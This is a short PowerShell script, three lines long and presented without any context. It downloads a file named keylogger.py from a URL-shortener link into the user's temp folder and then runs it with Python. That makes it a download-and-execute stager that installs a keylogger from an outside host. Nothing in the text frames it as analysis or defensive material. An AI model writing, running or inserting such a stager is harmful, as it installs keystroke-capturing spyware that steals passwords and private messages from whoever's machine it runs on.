$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://rebrand.ly/5uapstf", "$env:temp\keylogger.py")
python3 "$env:temp\keylogger.py"
